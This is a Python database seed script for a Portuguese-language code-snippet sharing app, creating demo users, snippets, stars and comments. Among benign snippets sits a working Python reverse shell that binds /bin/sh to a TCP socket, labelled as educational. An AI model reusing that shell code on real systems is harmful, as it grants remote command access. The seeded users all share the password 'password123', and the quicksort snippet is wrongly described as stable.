from .database import SessionLocal
from . import models
from .security import hash_password


def _tags(names):
    return names


def seed():
    db = SessionLocal()
    try:
        if db.query(models.User).count() > 0:
            return

        users = [
            models.User(username="ada", email="ada@developpeur.dev",
                        hashed_password=hash_password("password123"),
                        bio="Matemática, algoritmos e o primeiro programa da história.",
                        avatar_color="#7c5cff"),
            models.User(username="linus", email="linus@developpeur.dev",
                        hashed_password=hash_password("password123"),
                        bio="Kernel maintainer. Bash, C e ferramentas de sistema.",
                        avatar_color="#ff5c8a"),
            models.User(username="grace", email="grace@developpeur.dev",
                        hashed_password=hash_password("password123"),
                        bio="Compiladores, COBOL e abstrações limpas.",
                        avatar_color="#5cd0ff"),
            models.User(username="turing", email="turing@developpeur.dev",
                        hashed_password=hash_password("password123"),
                        bio="Máquinas que pensam. Criptografia e teoria.",
                        avatar_color="#ffb85c"),
        ]
        for u in users:
            db.add(u)
        db.flush()

        snippets_data = [
            {
                "author": users[0],
                "title": "Debounce em JavaScript",
                "description": "Utilitário de debounce com suporte a cancelamento explícito. Essencial para inputs de busca.",
                "language": "javascript",
                "tags": ["javascript", "utility", "performance"],
                "code": (
                    "export function debounce(fn, wait = 200) {\n"
                    "  let t = null;\n"
                    "  const debounced = (...args) => {\n"
                    "    if (t) clearTimeout(t);\n"
                    "    t = setTimeout(() => fn(...args), wait);\n"
                    "  };\n"
                    "  debounced.cancel = () => { if (t) clearTimeout(t); t = null; };\n"
                    "  return debounced;\n"
                    "}"
                ),
            },
            {
                "author": users[1],
                "title": "Reverse shell TCP em Python",
                "description": "Demonstração didática de socket TCP reverso. Uso estritamente educacional em ambientes controlados.",
                "language": "python",
                "tags": ["python", "networking", "sockets"],
                "code": (
                    "import socket, subprocess, os\n\n"
                    "def reverse(host: str, port: int):\n"
                    "    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
                    "    s.connect((host, port))\n"
                    "    os.dup2(s.fileno(), 0)\n"
                    "    os.dup2(s.fileno(), 1)\n"
                    "    os.dup2(s.fileno(), 2)\n"
                    "    subprocess.call(['/bin/sh', '-i'])\n\n"
                    "if __name__ == '__main__':\n"
                    "    reverse('127.0.0.1', 4444)"
                ),
            },
            {
                "author": users[2],
                "title": "QuickSort com particionamento Hoare",
                "description": "Implementação estável em memória usando particionamento de Hoare, com inserção para arrays pequenos.",
                "language": "python",
                "tags": ["python", "algorithms", "sorting"],
                "code": (
                    "def quicksort(arr):\n"
                    "    def _qs(lo, hi):\n"
                    "        while lo < hi:\n"
                    "            if hi - lo < 16:\n"
                    "                for i in range(lo + 1, hi + 1):\n"
                    "                    v, j = arr[i], i\n"
                    "                    while j > lo and arr[j - 1] > v:\n"
                    "                        arr[j] = arr[j - 1]; j -= 1\n"
                    "                    arr[j] = v\n"
                    "                return\n"
                    "            mid = (lo + hi) // 2\n"
                    "            if arr[mid] < arr[lo]: arr[mid], arr[lo] = arr[lo], arr[mid]\n"
                    "            if arr[hi] < arr[lo]: arr[hi], arr[lo] = arr[lo], arr[hi]\n"
                    "            if arr[hi] < arr[mid]: arr[hi], arr[mid] = arr[mid], arr[hi]\n"
                    "            pivot = arr[mid]\n"
                    "            i, j = lo - 1, hi + 1\n"
                    "            while True:\n"
                    "                i += 1\n"
                    "                while arr[i] < pivot: i += 1\n"
                    "                j -= 1\n"
                    "                while arr[j] > pivot: j -= 1\n"
                    "                if i >= j: break\n"
                    "                arr[i], arr[j] = arr[j], arr[i]\n"
                    "            _qs(lo, j); lo = j + 1\n"
                    "    _qs(0, len(arr) - 1)\n"
                    "    return arr"
                ),
            },
            {
                "author": users[0],
                "title": "Hook React para fetch com AbortController",
                "description": "Hook com estados tipados, cancelamento em unmount e refetch manual.",
                "language": "javascript",
                "tags": ["react", "hooks", "javascript", "utility"],
                "code": (
                    "import { useCallback, useEffect, useRef, useState } from 'react';\n\n"
                    "export function useFetch(url) {\n"
                    "  const [state, setState] = useState({ data: null, loading: !!url, error: null });\n"
                    "  const abortRef = useRef(null);\n\n"
                    "  const run = useCallback(async () => {\n"
                    "    if (!url) return;\n"
                    "    abortRef.current?.abort();\n"
                    "    const ctrl = new AbortController();\n"
                    "    abortRef.current = ctrl;\n"
                    "    setState((s) => ({ ...s, loading: true, error: null }));\n"
                    "    try {\n"
                    "      const res = await fetch(url, { signal: ctrl.signal });\n"
                    "      if (!res.ok) throw new Error(`HTTP ${res.status}`);\n"
                    "      const data = await res.json();\n"
                    "      setState({ data, loading: false, error: null });\n"
                    "    } catch (err) {\n"
                    "      if (err.name !== 'AbortError')\n"
                    "        setState({ data: null, loading: false, error: err.message });\n"
                    "    }\n"
                    "  }, [url]);\n\n"
                    "  useEffect(() => { run(); return () => abortRef.current?.abort(); }, [run]);\n"
                    "  return { ...state, refetch: run };\n"
                    "}"
                ),
            },
            {
                "author": users[1],
                "title": "Decorator de retry com backoff exponencial",
                "description": "Retry configurável em Python puro com jitter e limite de tentativas.",
                "language": "python",
                "tags": ["python", "utility", "resilience"],
                "code": (
                    "import functools, random, time\n\n"
                    "def retry(times=3, base=0.2, max_delay=5.0, jitter=0.1, exceptions=(Exception,)):\n"
                    "    def deco(fn):\n"
                    "        @functools.wraps(fn)\n"
                    "        def wrapper(*args, **kwargs):\n"
                    "            last = None\n"
                    "            for attempt in range(times):\n"
                    "                try:\n"
                    "                    return fn(*args, **kwargs)\n"
                    "                except exceptions as exc:\n"
                    "                    last = exc\n"
                    "                    delay = min(max_delay, base * (2 ** attempt))\n"
                    "                    delay += random.uniform(0, jitter)\n"
                    "                    time.sleep(delay)\n"
                    "            raise last\n"
                    "        return wrapper\n"
                    "    return deco"
                ),
            },
            {
                "author": users[2],
                "title": "LRU Cache em TypeScript",
                "description": "Cache LRU com complexidade O(1) usando Map + lista ligada implícita.",
                "language": "typescript",
                "tags": ["typescript", "data-structures", "cache"],
                "code": (
                    "export class LRUCache<K, V> {\n"
                    "  private map = new Map<K, V>();\n"
                    "  constructor(private readonly capacity: number) {\n"
                    "    if (capacity <= 0) throw new Error('capacity must be > 0');\n"
                    "  }\n"
                    "  get(key: K): V | undefined {\n"
                    "    if (!this.map.has(key)) return undefined;\n"
                    "    const val = this.map.get(key)!;\n"
                    "    this.map.delete(key);\n"
                    "    this.map.set(key, val);\n"
                    "    return val;\n"
                    "  }\n"
                    "  set(key: K, value: V): void {\n"
                    "    if (this.map.has(key)) this.map.delete(key);\n"
                    "    this.map.set(key, value);\n"
                    "    if (this.map.size > this.capacity) {\n"
                    "      const oldest = this.map.keys().next().value as K;\n"
                    "      this.map.delete(oldest);\n"
                    "    }\n"
                    "  }\n"
                    "}"
                ),
            },
            {
                "author": users[3],
                "title": "Cifra de César em Rust",
                "description": "Implementação segura e testável de cifra de César para caracteres ASCII.",
                "language": "rust",
                "tags": ["rust", "crypto", "algorithms"],
                "code": (
                    "pub fn caesar(text: &str, shift: u8) -> String {\n"
                    "    text.chars()\n"
                    "        .map(|c| {\n"
                    "            if c.is_ascii_lowercase() {\n"
                    "                let base = b'a';\n"
                    "                let offset = (c as u8 - base + shift % 26) % 26;\n"
                    "                (base + offset) as char\n"
                    "            } else if c.is_ascii_uppercase() {\n"
                    "                let base = b'A';\n"
                    "                let offset = (c as u8 - base + shift % 26) % 26;\n"
                    "                (base + offset) as char\n"
                    "            } else {\n"
                    "                c\n"
                    "            }\n"
                    "        })\n"
                    "        .collect()\n"
                    "}"
                ),
            },
            {
                "author": users[0],
                "title": "Binary search em Go",
                "description": "Busca binária genérica em slices ordenados usando generics.",
                "language": "go",
                "tags": ["go", "algorithms", "search"],
                "code": (
                    "package search\n\n"
                    "func BinarySearch[T Ordered](xs []T, target T) (int, bool) {\n"
                    "\tlo, hi := 0, len(xs)-1\n"
                    "\tfor lo <= hi {\n"
                    "\t\tmid := (lo + hi) / 2\n"
                    "\t\tswitch {\n"
                    "\t\tcase xs[mid] < target:\n"
                    "\t\t\tlo = mid + 1\n"
                    "\t\tcase xs[mid] > target:\n"
                    "\t\t\thi = mid - 1\n"
                    "\t\tdefault:\n"
                    "\t\t\treturn mid, true\n"
                    "\t\t}\n"
                    "\t}\n"
                    "\treturn -1, false\n"
                    "}\n\n"
                    "type Ordered interface {\n"
                    "\t~int | ~int64 | ~float64 | ~string\n"
                    "}"
                ),
            },
            {
                "author": users[1],
                "title": "SQL — Top usuários por estrelas recebidas",
                "description": "Ranking de autores por total de estrelas em seus snippets públicos.",
                "language": "sql",
                "tags": ["sql", "postgres", "analytics"],
                "code": (
                    "SELECT\n"
                    "  u.username,\n"
                    "  COUNT(DISTINCT s.id) AS snippets,\n"
                    "  COUNT(st.id)         AS stars\n"
                    "FROM users u\n"
                    "JOIN snippets s ON s.author_id = u.id AND s.is_public = TRUE\n"
                    "LEFT JOIN stars st ON st.snippet_id = s.id\n"
                    "GROUP BY u.id, u.username\n"
                    "ORDER BY stars DESC, snippets DESC\n"
                    "LIMIT 20;"
                ),
            },
            {
                "author": users[2],
                "title": "Dockerfile multi-stage para Node",
                "description": "Build otimizado para produção com camada de dependências separada.",
                "language": "bash",
                "tags": ["docker", "devops", "node"],
                "code": (
                    "FROM node:20-alpine AS deps\n"
                    "WORKDIR /app\n"
                    "COPY package*.json ./\n"
                    "RUN npm ci --only=production\n\n"
                    "FROM node:20-alpine AS build\n"
                    "WORKDIR /app\n"
                    "COPY package*.json ./\n"
                    "RUN npm ci\n"
                    "COPY . .\n"
                    "RUN npm run build\n\n"
                    "FROM node:20-alpine AS runner\n"
                    "WORKDIR /app\n"
                    "ENV NODE_ENV=production\n"
                    "COPY --from=deps /app/node_modules ./node_modules\n"
                    "COPY --from=build /app/dist ./dist\n"
                    "EXPOSE 3000\n"
                    "CMD [\"node\", \"dist/server.js\"]"
                ),
            },
        ]

        for data in snippets_data:
            s = models.Snippet(
                title=data["title"],
                description=data["description"],
                code=data["code"],
                language=data["language"],
                is_public=True,
                author_id=data["author"].id,
                views=0,
            )
            s.tags = _attach_tags(db, data["tags"])
            db.add(s)

        db.commit()

        stars = [
            (users[1], 0), (users[2], 0), (users[3], 0),
            (users[0], 1), (users[2], 1),
            (users[0], 2), (users[3], 2),
            (users[1], 3), (users[2], 3), (users[3], 3),
            (users[0], 4), (users[1], 4),
            (users[3], 5), (users[0], 5),
            (users[0], 6), (users[1], 6),
            (users[2], 7), (users[0], 7),
            (users[1], 8), (users[2], 8),
        ]
        snippets = db.query(models.Snippet).order_by(models.Snippet.id).all()
        for user, idx in stars:
            if idx < len(snippets):
                db.add(models.Star(user_id=user.id, snippet_id=snippets[idx].id))

        if snippets:
            db.add(models.Comment(
                body="Exatamente o que eu precisava. Adicionei suporte a AbortSignal na minha versão.",
                snippet_id=snippets[0].id, author_id=users[2].id,
            ))
            db.add(models.Comment(
                body="Boa implementação. Sugiro considerar caching do resultado.",
                snippet_id=snippets[2].id, author_id=users[3].id,
            ))
        db.commit()
    finally:
        db.close()


def _attach_tags(db, names):
    import re
    from . import models as m

    def _slug(n):
        return re.sub(r"[^a-zA-Z0-9]+", "-", n.strip().lower()).strip("-") or "tag"

    result = []
    for name in names:
        slug = _slug(name)
        tag = db.query(m.Tag).filter(m.Tag.slug == slug).first()
        if not tag:
            tag = m.Tag(name=name, slug=slug)
            db.add(tag)
            db.flush()
        result.append(tag)
    return result
